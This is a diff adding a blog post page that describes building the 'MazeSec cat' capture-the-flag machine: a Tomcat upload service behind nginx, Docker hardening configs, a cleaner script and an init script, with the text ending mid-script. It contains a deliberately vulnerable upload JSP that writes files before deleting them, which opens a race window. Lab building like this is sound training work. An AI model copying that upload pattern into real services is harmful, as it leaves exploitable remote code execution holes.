@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>MazeSec cat靶机设计流程 - the0n3</title>
+        <meta name="description" content="靶机模拟了一个不出网的Tomcat文件上传服务，上传先写入再检查文件类型，考察条件竞争，搭配了一个高频清理服务，防止文件webshell生成文件webshell绕过检测获取到稳定控制，通过html注释信息引导选手考虑“运行时”的利用手法，利用条件竞争打一个内存马实现稳定利用，在容器里拿到靶机私钥。提权部分准备了多个suid文件（sh、vi、cp、cat、mv）,均为busybox applet，起到迷惑选手作用，真正提权为suid的&#039;vi &#039;，直接利用vi执行shell命令遇到提权“伪失败”的情况原因也是/bin/sh是busybox的applet。">
+    <link rel="canonical" href="https://the0n3.top/posts/maze-cat/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="MazeSec cat靶机设计流程">
+    <meta property="og:description" content="靶机模拟了一个不出网的Tomcat文件上传服务，上传先写入再检查文件类型，考察条件竞争，搭配了一个高频清理服务，防止文件webshell生成文件webshell绕过检测获取到稳定控制，通过html注释信息引导选手考虑“运行时”的利用手法，利用条件竞争打一个内存马实现稳定利用，在容器里拿到靶机私钥。提权部分准备了多个suid文件（sh、vi、cp、cat、mv）,均为busybox applet，起到迷惑选手作用，真正提权为suid的&#039;vi &#039;，直接利用vi执行shell命令遇到提权“伪失败”的情况原因也是/bin/sh是busybox的applet。">
+    <meta property="og:url" content="https://the0n3.top/posts/maze-cat/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/og-default.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="MazeSec cat靶机设计流程">
+    <meta name="twitter:description" content="靶机模拟了一个不出网的Tomcat文件上传服务，上传先写入再检查文件类型，考察条件竞争，搭配了一个高频清理服务，防止文件webshell生成文件webshell绕过检测获取到稳定控制，通过html注释信息引导选手考虑“运行时”的利用手法，利用条件竞争打一个内存马实现稳定利用，在容器里拿到靶机私钥。提权部分准备了多个suid文件（sh、vi、cp、cat、mv）,均为busybox applet，起到迷惑选手作用，真正提权为suid的&#039;vi &#039;，直接利用vi执行shell命令遇到提权“伪失败”的情况原因也是/bin/sh是busybox的applet。">
+        <meta name="twitter:image" content="https://the0n3.top/images/og-default.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 评论系统预连接：giscus 由前端按访客主题动态注入，提前建连可抵消注入延迟 -->
+    <link rel="preconnect" href="https://giscus.app" crossorigin>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/nav-menu/style.css">
+        <link rel="stylesheet" href="/assets/features/random-recommend/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                <details class="nav-menu">
+                    <summary class="nav-toggle" aria-label="打开菜单"><span aria-hidden="true">☰</span></summary>
+                </details>
+                <div class="nav-links">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                </div>
+                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>MazeSec cat靶机设计流程</h1>
+    <p>
+        <span class="meta">发布于: 2026-09-27 12:18</span>
+    </p>
+    <div class="post-body">
+        <p>靶机灵感：​ 不出网环境下的内存马实战。入口为 nginx 反代容器 Tomcat 的文件上传服务，容器内隔离、不可外联。上传 JSP 后服务端立即删除，选手需通过条件竞争在删除窗口内触发 JSP 执行，注入内存马获取稳定控制。容器内藏有宿主机 SSH 私钥，选手取回后登录靶机，在多个 SUID 文件中识别真正的提权点（SUID vi）完成 root。</p>
+<p>设计考量：​ 靶机基于 Alpine Linux 部署，通过 Docker 运行低权限（uid 10001）Tomcat 9 文件上传服务，容器接入 internal 网络禁止外联，由宿主机 nginx 反代暴露入口，从网络层面堵死反弹 shell 路径，强制选手通过条件竞争在 JSP 写入后被删除的短暂窗口内触发执行，注入内存马获取稳定控制。容器整体只读，仅 uploads/ 目录可写，配置禁止 WAR 热部署绕过和已删 JSP 缓存复用，确保攻击面收敛于单一竞争窗口。内存马执行命令读取容器内预置的 SSH 私钥后，选手从攻击机直接登录宿主机，面对多个 SUID busybox applet 烟雾弹，需识别真正的提权点——具备 SUID 属性的独立二进制 vi，通过写入 sudoers 或启动 root shell 完成提权。宿主机通过 docker compose 配置开机自启，保证靶机环境持久可用。</p>
+<h2>设置主机名</h2>
+<pre><code class="language-bash"># 设置主机名
+hostname cat
+echo "cat" &gt; /etc/hostname
+
+# 确认 /etc/hosts 包含
+# 127.0.0.1   localhost cat</code></pre>
+<h2>安装基础环境</h2>
+<pre><code class="language-bash">apk add docker python3 docker-compose</code></pre>
+<p>启动 Docker 并设置自启</p>
+<pre><code class="language-bash">rc-update add docker default
+service docker start</code></pre>
+<p>docker 加速</p>
+<pre><code class="language-bash">mkdir -p /etc/docker
+cat &gt; /etc/docker/daemon.json &lt;&lt;'EOF'
+{
+  "registry-mirrors": [
+    "https://docker.1ms.run",
+    "https://docker.m.daocloud.io",
+    "https://docker.1panel.live"
+  ]
+}
+EOF</code></pre>
+<p>重启docker</p>
+<pre><code class="language-bash">rc-service docker restart</code></pre>
+<h2>tomcat部署思路（仅讨论）</h2>
+<p>tomcat 目录结构如下</p>
+<pre><code class="language-plaintext">/usr/local/tomcat/
+├── bin/           启动脚本
+├── conf/          核心配置（重点）
+│   ├── server.xml
+│   ├── web.xml
+│   └── Catalina/
+│       └── localhost/
+├── lib/           servlet / tomcat 核心 jar
+├── webapps/
+│   └── ROOT/      默认应用
+├── work/          JSP 编译目录
+├── temp/
+└── logs/</code></pre>
+<p>其中，部分可以解析jsp的目录如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th>位置</th>
+<th>能否解析</th>
+<th>是否需重启</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$CATALINA_BASE/webapps/&lt;app&gt;/**/*.jsp</code>、<code>.jspx</code>、<code>.jspf</code></td>
+<td>是</td>
+<td>否</td>
+<td>主战场</td>
+</tr>
+<tr>
+<td><code>$CATALINA_BASE/webapps/&lt;name&gt;.war</code></td>
+<td>是</td>
+<td>否</td>
+<td><code>autoDeploy=true</code> 时 HostConfig 后台扫描部署，解压出目录后 JSP 就能跑</td>
+</tr>
+<tr>
+<td><code>$CATALINA_BASE/webapps/&lt;任意新目录&gt;/</code></td>
+<td>是</td>
+<td>否</td>
+<td>新建目录即新 Context</td>
+</tr>
+<tr>
+<td><code>work/**</code></td>
+<td>否</td>
+<td>—</td>
+<td>只有编译产物，JSP 源缺失即失效，不是攻击面</td>
+</tr>
+</tbody>
+</table>
+<p>让整个容器只读，只留一个可写目录，避免选手到别处写。</p>
+<pre><code class="language-yml"># docker-compose.yml
+services:
+  tomcat:
+    image: ctf-tomcat:9
+    user: "10001:10001"
+    read_only: true
+    cap_drop: [ALL]
+    security_opt: ["no-new-privileges:true"]
+    tmpfs:
+      - /tmp:size=64m
+      - /usr/local/tomcat/work:size=128m,uid=10001,gid=10001
+      - /usr/local/tomcat/temp:size=64m,uid=10001,gid=10001
+      - /usr/local/tomcat/logs:size=64m,uid=10001,gid=10001
+    volumes:
+      - ./uploads:/usr/local/tomcat/webapps/ROOT/uploads:rw
+    ports:
+      - "127.0.0.1:8080:8080"
+    networks: [ctf-internal]
+    restart: unless-stopped
+    deploy:
+      resources:
+        limits: { memory: 768M }
+
+networks:
+  ctf-internal:
+    internal: true</code></pre>
+<p>关掉 WAR 热部署</p>
+<pre><code class="language-xml">&lt;Host name="localhost" appBase="webapps"
+      autoDeploy="false" deployOnStartup="true"
+      unpackWARs="false" deployXML="false"&gt;</code></pre>
+<p>显式定义 Context，且 reloadable=false</p>
+<pre><code class="language-xml">&lt;!-- conf/Catalina/localhost/ROOT.xml --&gt;
+&lt;Context docBase="/usr/local/tomcat/webapps/ROOT" reloadable="false"
+         allowLinking="false" privileged="false" antiResourceLocking="false"/&gt;</code></pre>
+<p>清洗脚本只盯 ./uploads 这一个目录</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+# /opt/cat/cleaner.py
+import os, time, shutil, logging
+
+WATCH = "/opt/cat/uploads"
+TTL   = 1.5
+SWEEP = 0.25
+
+# Tomcat 可解析的类型
+TARGETS = ('.jsp', '.jspx', '.jspf', '.war')
+
+logging.basicConfig(
+    filename="/var/log/ctf-cleaner.log",
+    level=logging.INFO,
+    format="%(asctime)s %(message)s"
+)
+
+while True:
+    now = time.time()
+    for root, dirs, files in os.walk(WATCH, topdown=False):
+        for name in files + dirs:
+            p = os.path.join(root, name)
+
+            # 目录：递归进去，不删目录本身（除非空）
+            if os.path.isdir(p) and not os.path.islink(p):
+                continue
+
+            # 只处理可解析类型
+            if not name.lower().endswith(TARGETS):
+                continue
+
+            try:
+                st = os.lstat(p)
+                age = now - max(st.st_ctime, st.st_mtime)
+                if age &gt;= TTL:
+                    os.unlink(p)
+                    logging.info("PURGE %s (age=%.2fs)", p, age)
+            except FileNotFoundError:
+                pass
+    time.sleep(SWEEP)</code></pre>
+<p>另外，Tomcat 9 用 javax.servlet.<em>，Tomcat 10+ 用 jakarta.servlet.</em></p>
+<p>最终靶机结构</p>
+<pre><code class="language-plaintext">/opt/cat/
+├── docker-compose.yml
+├── Dockerfile
+├── id_ed25519              ← SSH 私钥（构建时 COPY 进容器）
+├── id_ed25519.pub
+├── cleaner.py
+├── conf/
+│   ├── server.xml
+│   ├── web.xml
+│   └── Catalina/
+│       └── localhost/
+│           └── ROOT.xml
+├── uploads/                ← 唯一可写 web 目录
+└── webapps/
+    └── ROOT/
+        └── index.jsp       ← 文件上传入口</code></pre>
+<h2>tomcat部署</h2>
+<p>以下操作在<code>/opt/cat</code>目录下创建</p>
+<p>/opt/cat/Dockerfile</p>
+<pre><code class="language-dockerfile">FROM tomcat:9.0-jdk8-temurin
+
+RUN groupadd -g 10001 tomcat \
+ &amp;&amp; useradd -u 10001 -g 10001 -M -s /sbin/nologin tomcat
+
+COPY conf/server.xml /usr/local/tomcat/conf/server.xml
+COPY conf/web.xml /usr/local/tomcat/conf/web.xml
+COPY conf/Catalina/localhost/ROOT.xml /usr/local/tomcat/conf/Catalina/localhost/ROOT.xml
+COPY webapps/ROOT/index.jsp /usr/local/tomcat/webapps/ROOT/index.jsp
+
+RUN mkdir -p /usr/local/tomcat/webapps/ROOT/uploads
+
+COPY id_ed25519 /opt/ops/id_ed25519
+RUN chmod 0400 /opt/ops/id_ed25519 \
+ &amp;&amp; chown 10001:10001 /opt/ops/id_ed25519
+
+RUN chown -R root:tomcat /usr/local/tomcat \
+ &amp;&amp; chmod -R g+rX /usr/local/tomcat
+
+USER 10001:10001
+
+EXPOSE 8080
+
+ENV JAVA_OPTS="-Xms128m -Xmx384m -XX:+UseG1GC"
+CMD ["catalina.sh", "run"]</code></pre>
+<p>/opt/cat/conf/server.xml</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;Server port="8005" shutdown="SHUTDOWN"&gt;
+
+  &lt;Listener className="org.apache.catalina.startup.VersionLoggerListener" /&gt;
+  &lt;Listener className="org.apache.catalina.core.AprLifecycleListener" SSLEngine="on" /&gt;
+  &lt;Listener className="org.apache.catalina.core.JreMemoryLeakPreventionListener" /&gt;
+  &lt;Listener className="org.apache.catalina.mbeans.GlobalResourcesLifecycleListener" /&gt;
+  &lt;Listener className="org.apache.catalina.core.ThreadLocalLeakPreventionListener" /&gt;
+
+  &lt;GlobalNamingResources&gt;
+    &lt;Resource name="UserDatabase" auth="Container"
+              type="org.apache.catalina.UserDatabase"
+              description="User database"
+              factory="org.apache.catalina.users.MemoryUserDatabaseFactory"
+              pathname="conf/tomcat-users.xml" /&gt;
+  &lt;/GlobalNamingResources&gt;
+
+  &lt;Service name="Catalina"&gt;
+    &lt;Connector port="8080"
+               address="0.0.0.0"
+               protocol="HTTP/1.1"
+               connectionTimeout="20000"
+               redirectPort="8443" /&gt;
+
+    &lt;Engine name="Catalina" defaultHost="localhost"&gt;
+      &lt;Realm className="org.apache.catalina.realm.LockOutRealm"&gt;
+        &lt;Realm className="org.apache.catalina.realm.UserDatabaseRealm"
+               resourceName="UserDatabase"/&gt;
+      &lt;/Realm&gt;
+
+      &lt;Host name="localhost"
+            appBase=""
+            unpackWARs="false"
+            autoDeploy="false"
+            deployOnStartup="true"
+            deployXML="false"&gt;
+      &lt;/Host&gt;
+    &lt;/Engine&gt;
+  &lt;/Service&gt;
+&lt;/Server&gt;</code></pre>
+<p>/opt/cat/conf/web.xml</p>
+<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                             http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0"&gt;
+
+    &lt;!-- DefaultServlet：处理静态资源 --&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
+        &lt;init-param&gt;
+            &lt;param-name&gt;debug&lt;/param-name&gt;
+            &lt;param-value&gt;0&lt;/param-value&gt;
+        &lt;/init-param&gt;
+        &lt;init-param&gt;
+            &lt;param-name&gt;listings&lt;/param-name&gt;
+            &lt;param-value&gt;true&lt;/param-value&gt;
+        &lt;/init-param&gt;
+        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;/&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+
+    &lt;!-- JspServlet：关键配置 --&gt;
+    &lt;servlet&gt;
+        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;
+        &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;
+        &lt;!-- 每次请求都检查文件是否过期（源文件删了立即失效） --&gt;
+        &lt;init-param&gt;
+            &lt;param-name&gt;modificationTestInterval&lt;/param-name&gt;
+            &lt;param-value&gt;0&lt;/param-value&gt;
+        &lt;/init-param&gt;
+        &lt;!-- 开发模式：不缓存编译结果 --&gt;
+        &lt;init-param&gt;
+            &lt;param-name&gt;development&lt;/param-name&gt;
+            &lt;param-value&gt;true&lt;/param-value&gt;
+        &lt;/init-param&gt;
+        &lt;load-on-startup&gt;3&lt;/load-on-startup&gt;
+    &lt;/servlet&gt;
+    &lt;servlet-mapping&gt;
+        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;
+        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
+        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;
+    &lt;/servlet-mapping&gt;
+
+    &lt;session-config&gt;
+        &lt;session-timeout&gt;30&lt;/session-timeout&gt;
+    &lt;/session-config&gt;
+
+    &lt;welcome-file-list&gt;
+        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;
+    &lt;/welcome-file-list&gt;
+&lt;/web-app&gt;</code></pre>
+<p>/opt/cat/conf/Catalina/localhost/ROOT.xml</p>
+<pre><code class="language-xml">&lt;Context
+    docBase="/usr/local/tomcat/webapps/ROOT"
+    reloadable="false"
+    antiResourceLocking="false"
+    allowLinking="false"
+    privileged="false" /&gt;</code></pre>
+<p>/opt/cat/docker-compose.yml</p>
+<pre><code class="language-yml">services:
+  tomcat:
+    image: ctf-tomcat:9
+    user: "10001:10001"
+    read_only: true
+    cap_drop: [ALL]
+    security_opt: ["no-new-privileges:true"]
+    tmpfs:
+      - /tmp:size=64m
+      - /usr/local/tomcat/work:size=128m,uid=10001,gid=10001
+      - /usr/local/tomcat/temp:size=64m,uid=10001,gid=10001
+      - /usr/local/tomcat/logs:size=64m,uid=10001,gid=10001
+    volumes:
+      - ./uploads:/usr/local/tomcat/webapps/ROOT/uploads:rw
+    networks:
+      ctf-internal:
+        ipv4_address: 172.28.0.111
+    restart: unless-stopped
+    deploy:
+      resources:
+        limits: { memory: 768M }
+
+networks:
+  ctf-internal:
+    internal: true
+    ipam:
+      config:
+        - subnet: 172.28.0.0/24</code></pre>
+<p>文件上传服务入口</p>
+<p>/opt/cat/webapps/ROOT/index.jsp</p>
+<pre><code class="language-jsp">&lt;%@ page import="java.io.*" pageEncoding="UTF-8" contentType="text/html;charset=UTF-8" %&gt;
+&lt;%@ page session="false" %&gt;
+&lt;%
+if ("POST".equalsIgnoreCase(request.getMethod())) {
+    response.setContentType("text/plain;charset=UTF-8");
+
+    String name = request.getHeader("X-File-Name");
+    if (name == null || name.isEmpty()) {
+        response.setStatus(400);
+        response.getWriter().write("Missing X-File-Name");
+        return;
+    }
+    name = java.net.URLDecoder.decode(name, "UTF-8");
+    name = new File(name).getName();
+    if (name.contains("..") || name.contains("/") || name.contains("\\")) {
+        response.setStatus(400);
+        response.getWriter().write("Invalid filename");
+        return;
+    }
+
+    File dir = new File(application.getRealPath("/uploads"));
+    if (!dir.exists()) dir.mkdirs();
+    File target = new File(dir, name);
+
+    boolean writeCompleted = false;
+    try (InputStream is = request.getInputStream();
+         FileOutputStream fos = new FileOutputStream(target)) {
+        byte[] buf = new byte[8192];
+        int len;
+        while ((len = is.read(buf)) &gt; 0) fos.write(buf, 0, len);
+        writeCompleted = true;
+    } catch (Exception e) {
+        // 写入失败也往下走，统一处理删除
+    }
+
+    String lower = name.toLowerCase();
+    boolean isDangerous =
+        lower.endsWith(".jsp") ||
+        lower.endsWith(".jspx") ||
+        lower.endsWith(".jspf");
+
+    if (isDangerous) {
+        try { Thread.sleep(30); } catch (InterruptedException ignored) {}
+        target.delete();
+        response.setStatus(200);
+        response.getWriter().write("OK:/uploads/" + name + " (security scan: removed)");
+    } else {
+        response.setStatus(200);
+        response.getWriter().write("OK:/uploads/" + name + " (security scan: passed)");
+    }
+    return;
+}
+%&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang="zh-CN"&gt;
+&lt;head&gt;
+&lt;meta charset="UTF-8"&gt;
+&lt;meta name="viewport" content="width=device-width,initial-scale=1"&gt;
+&lt;title&gt;文件上传&lt;/title&gt;
+&lt;style&gt;
+:root{
+  --bg:#FAFAF9;--surface:#FFFFFF;--fg:#18181B;--muted:#5F6169;
+  --dim:#8E9099;--line:rgba(0,0,0,.08);--line-strong:rgba(0,0,0,.16);
+  --ok:#15803D;--err:#B91C1C;
+  --ease:cubic-bezier(.16,1,.3,1);
+  --mono:'SF Mono','JetBrains Mono','Fira Code',ui-monospace,Menlo,Consolas,monospace;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:Inter,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,
+              'PingFang SC','Hiragino Sans GB','Microsoft YaHei',sans-serif;
+  background:var(--bg);color:var(--fg);min-height:100vh;
+  display:flex;align-items:center;justify-content:center;
+  padding:24px; -webkit-font-smoothing:antialiased;
+}
+.panel{
+  width:100%;max-width:600px;background:var(--surface);
+  border:1px solid var(--line);border-radius:16px;
+  padding:36px;box-shadow:0 1px 2px rgba(0,0,0,.03),0 16px 40px -24px rgba(0,0,0,.1);
+}
+h1{font-size:32px;font-weight:600;letter-spacing:-.032em;line-height:1.2;margin-bottom:12px}
+.lede{font-size:17px;line-height:1.6;color:var(--muted);margin-bottom:24px}
+.spec{border-top:1px solid var(--line);margin-bottom:20px}
+.spec-row{display:flex;align-items:baseline;justify-content:space-between;gap:16px;padding:11px 0;border-bottom:1px solid var(--line)}
+.spec-row dt{font-size:15px;color:var(--muted)}
+.spec-row dd{font-family:var(--mono);font-size:14px;color:#3F3F46;white-space:nowrap}
+.drop{
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:10px;
+  min-height:156px;padding:28px 24px;border:1px dashed var(--line-strong);
+  border-radius:12px;background:#FCFCFB;cursor:pointer;text-align:center;
+  transition:border-color .25s var(--ease),background .25s var(--ease);
+}
+.drop:hover{border-color:rgba(0,0,0,.24);background:#F7F7F6}
+.drop.over{border-style:solid;border-color:var(--fg);background:#F4F4F3}
+.drop input{display:none}
+.drop svg{width:24px;height:24px;color:var(--dim);margin-bottom:2px;transition:color .25s var(--ease),transform .25s var(--ease)}
+.drop:hover svg{color:var(--muted)}
+.drop.over svg{color:var(--fg);transform:translateY(-2px)}
+.drop-title{font-size:16px;font-weight:500;color:#3F3F46}
+.drop-hint{font-size:14px;color:var(--dim)}
+.picked{margin-top:4px;padding:5px 11px;max-width:100%;word-break:break-all;font-family:var(--mono);font-size:13.5px;color:var(--fg);background:#F4F4F3;border:1px solid var(--line);border-radius:7px}
+.picked:empty{display:none}
+button{width:100%;margin-top:12px;padding:14px 20px;background:#18181B;color:#FAFAF9;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:background .2s var(--ease),transform .12s var(--ease)}
+button:hover:not(:disabled){background:#27272A}
+button:active:not(:disabled){transform:translateY(1px)}
+button:disabled{opacity:.28;cursor:not-allowed}
+.status{margin-top:12px;min-height:20px;font-family:var(--mono);font-size:13.5px;text-align:center;color:var(--dim)}
+.status.ok{color:var(--ok)}.status.err{color:var(--err)}
+@media(max-width:660px){body{padding:16px}.panel{padding:28px 22px}h1{font-size:26px}}
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class="panel"&gt;
+  &lt;h1&gt;文件上传&lt;/h1&gt;
+  &lt;p class="lede"&gt;将文件拖放到下方区域，或点击选择文件后上传。系统会在写入后立即进行安全校验并清理恶意文件。&lt;/p&gt;
+  &lt;dl class="spec"&gt;
+    &lt;div class="spec-row"&gt;&lt;dt&gt;运行时&lt;/dt&gt;&lt;dd&gt;OpenJDK 1.8&lt;/dd&gt;&lt;/div&gt;
+    &lt;div class="spec-row"&gt;&lt;dt&gt;服务端&lt;/dt&gt;&lt;dd&gt;Apache Tomcat 9.0&lt;/dd&gt;&lt;/div&gt;
+    &lt;div class="spec-row"&gt;&lt;dt&gt;反向代理&lt;/dt&gt;&lt;dd&gt;nginx 1.30.4&lt;/dd&gt;&lt;/div&gt;
+    &lt;div class="spec-row"&gt;&lt;dt&gt;网络&lt;/dt&gt;&lt;dd&gt;隔离环境&lt;/dd&gt;&lt;/div&gt;
+    &lt;!-- 已启用文件系统防护，时刻查杀木马文件，守护主机安全。 --&gt;
+    &lt;!-- 文件层防护已就位，运行时防护待补充。 --&gt;
+  &lt;/dl&gt;
+  &lt;form id="f"&gt;
+    &lt;label class="drop" id="drop"&gt;
+      &lt;input type="file" id="file" required&gt;
+      &lt;svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"&gt;
+        &lt;path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/&gt;&lt;polyline points="17 8 12 3 7 8"/&gt;&lt;line x1="12" y1="3" x2="12" y2="15"/&gt;
+      &lt;/svg&gt;
+      &lt;span class="drop-title"&gt;拖放文件到此处，或点击选择&lt;/span&gt;
+      &lt;span class="drop-hint"&gt;支持任意文件类型&lt;/span&gt;
+      &lt;span class="picked" id="fname"&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;button type="submit" id="btn"&gt;上传&lt;/button&gt;
+  &lt;/form&gt;
+  &lt;div class="status" id="status"&gt;&lt;/div&gt;
+&lt;/div&gt;
+&lt;script&gt;
+const drop=document.getElementById('drop'),file=document.getElementById('file'),
+      fname=document.getElementById('fname'),btn=document.getElementById('btn'),
+      status=document.getElementById('status'),form=document.getElementById('f');
+file.addEventListener('change',()=&gt;{fname.textContent=file.files[0]?file.files[0].name:''});
+['dragenter','dragover'].forEach(e=&gt;drop.addEventListener(e,ev=&gt;{ev.preventDefault();drop.classList.add('over')}));
+['dragleave','drop'].forEach(e=&gt;drop.addEventListener(e,ev=&gt;{ev.preventDefault();drop.classList.remove('over')}));
+drop.addEventListener('drop',ev=&gt;{if(ev.dataTransfer.files.length){file.files=ev.dataTransfer.files;fname.textContent=file.files[0].name}});
+form.addEventListener('submit',async e=&gt;{
+  e.preventDefault();
+  if(!file.files.length){status.className='status err';status.textContent='请先选择文件';return}
+  btn.disabled=true;status.className='status';status.textContent='上传中...';
+  try{
+    const r=await fetch('/',{method:'POST',headers:{'X-File-Name':encodeURIComponent(file.files[0].name)},body:file.files[0]});
+    if(r.ok){status.className='status ok';status.textContent=await r.text()}
+    else{status.className='status err';status.textContent='上传失败：HTTP '+r.status}
+  }catch(err){status.className='status err';status.textContent='错误：'+err.message}
+  btn.disabled=false;
+});
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+<h2>靶机凭证准备</h2>
+<pre><code class="language-bash"># 生成 SSH 密钥对
+ssh-keygen -t ed25519 -f ./id_ed25519 -N "" -C "daochunhan@cat"
+
+# 创建普通用户 daochunhan
+useradd -m -s /bin/bash daochunhan
+
+# 配置公钥登录
+mkdir -p /home/daochunhan/.ssh
+cp /opt/cat/id_ed25519.pub /home/daochunhan/.ssh/authorized_keys
+chown -R daochunhan:daochunhan /home/daochunhan/.ssh
+chmod 700 /home/daochunhan/.ssh
+chmod 600 /home/daochunhan/.ssh/authorized_keys
+
+# 验证
+ls -la /home/daochunhan/.ssh/authorized_keys
+# -rw------- 1 daochunhan daochunhan  &lt;日期&gt; authorized_keys</code></pre>
+<h2>编译镜像</h2>
+<pre><code class="language-bash"># 1. 停掉并删除容器（如果有）
+docker stop cat-tomcat-1
+docker rm cat-tomcat-1
+
+# 2. 删除旧镜像
+docker rmi ctf-tomcat:9
+
+# 3. 重新编译（在 /opt/cat 目录下）
+cd /opt/cat
+docker build -t ctf-tomcat:9 .</code></pre>
+<h2>nginx反代</h2>
+<p>关掉nginx原来配置的php-fpm，节省内存。</p>
+<pre><code class="language-bash"># 停止
+rc-service php-fpm85 stop
+# 关闭开机自启
+rc-update del php-fpm85 default</code></pre>
+<p>配置nginx反代</p>
+<pre><code class="language-bash">cat &gt; /etc/nginx/http.d/default.conf &lt;&lt; 'EOF'
+upstream ctf_tomcat {
+    server 172.28.0.111:8080;
+    keepalive 16;
+}
+
+server {
+    listen 80 default_server;
+    client_max_body_size 32m;
+
+    location / {
+        proxy_pass http://ctf_tomcat;
+        proxy_http_version 1.1;
+        proxy_set_header Host              $host;
+        proxy_set_header X-Real-IP         $remote_addr;
+        proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
+
+        proxy_buffering         off;
+        proxy_request_buffering off;
+        proxy_connect_timeout   5s;
+        proxy_read_timeout      30s;
+    }
+}
+EOF</code></pre>
+<h2>docker compose 启动</h2>
+<p>配置 docker-compose 自启</p>
+<p>/etc/init.d/maze-cat 启动脚本</p>
+<pre><code class="language-bash">#!/sbin/openrc-run
+description="MazeSec tomcat + cleaner"
+depend() {
+    need docker
+    after docker nginx
+    use nginx
+}
+
+CLEANER_PID="/var/run/ctf-cleaner.pid"
+
+start() {
+    ebegin "Starting MazeSec tomcat"
+
+    cd /opt/cat || eend 1 "cannot cd /opt/cat"
+
+    # 1. 启动 cleaner（宿主机 Python）
+    if [ -f "$CLEANER_PID" ] &amp;&amp; kill -0 "$(cat $CLEANER_PID)" 2&gt;/dev/null; then
+        ewarn "cleaner already running (pid $(cat $CLEANER_PID))"
+    else
+        nohup python3 /opt/cat/cleaner.py &gt;/dev/null 2&gt;&amp;1 &amp;
+        echo $! &gt; "$CLEANER_PID"
+        ewarn "cleaner started (pid $!)"
+    fi
+
+    # 2. 启动容器
+    /usr/bin/docker compose up -d
+    if [ $? -ne 0 ]; then
+        eend 1 "docker compose up failed"
+        return 1
+    fi
+
+    # 3. 等待 Tomcat 监听（最多 30 秒）
+    local i=0
+    while [ $i -lt 30 ]; do
